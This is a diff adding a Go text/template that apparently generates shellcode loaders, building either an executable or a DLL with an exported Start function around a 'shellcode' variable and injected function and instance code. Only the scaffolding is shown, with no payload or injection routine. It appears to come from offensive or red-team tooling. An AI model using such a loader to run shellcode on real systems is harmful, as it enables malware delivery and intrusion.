@@ -1,0 +1,58 @@
+package main
+
+{{if .IsDLL}}
+import "C"
+{{end}}
+
+import(
+{{range .Imports}} 
+    {{.}}
+{{end}}
+)
+
+{{if .Debug}}
+
+    var (
+        	debugWriter io.Writer
+        )
+
+func printDebug(t, format string, v ...interface{}) {
+		debugWriter = os.Stdout
+		var output string
+		switch t {
+		case "info":
+			output = "[INFO]    "
+		case "warning":
+			output = "[WARNING] "
+		case "error":
+			output = "[ERROR]   "
+		case "debug":
+			output = "[DEBUG]   "
+		}
+		output += format +"\n"
+		fmt.Fprintf(debugWriter, output, v...)
+	}
+{{end}}
+
+{{range .FunctionsCode}} 
+{{.}}
+{{end}}
+
+{{if .IsDLL}}
+func main(){}
+
+{{.ExportNames}}
+
+//export Start
+func Start(){
+
+{{else}}
+func main(){
+{{end}}
+    shellcode := {{.ShellcodeData}}
+
+{{range .InstancesCode}} 
+    {{.}}
+{{end}}
+
+}
